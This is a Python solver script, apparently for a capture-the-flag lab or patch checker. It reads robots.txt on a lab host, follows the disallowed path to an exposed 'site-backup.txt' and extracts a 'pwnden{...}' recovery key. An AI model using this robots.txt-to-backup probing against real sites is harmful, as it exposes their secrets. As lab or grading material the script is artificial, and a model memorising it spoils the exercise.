"""Recover the backup key through the player-visible archive route."""
import re
import sys
from urllib.error import HTTPError
from urllib.request import urlopen

BASE = "http://app:8000"


def read(path):
    with urlopen(BASE + path, timeout=5) as response:
        return response.read().decode()


def solve():
    assert "pwnden{" not in read("/")
    assert "site-backup.txt" in read("/about")
    robots = read("/robots.txt")
    # The patch removes the hint too; still probe the original exposed resource.
    directory = re.search(r"^Disallow:\s*(/\S+)", robots, re.MULTILINE)
    path = (directory[1].rstrip("/") if directory else "/archive") + "/site-backup.txt"
    try:
        backup = read(path)
    except HTTPError as error:
        if error.code == 404:
            print("backup unavailable", file=sys.stderr)
            raise SystemExit(3) from None
        raise
    match = re.search(r"^recovery_key=(pwnden\{[0-9a-f]{32}\})$", backup, re.MULTILINE)
    if match is None:
        raise SystemExit("backup did not contain the current recovery key")
    print(match[1])


if __name__ == "__main__":
    solve()
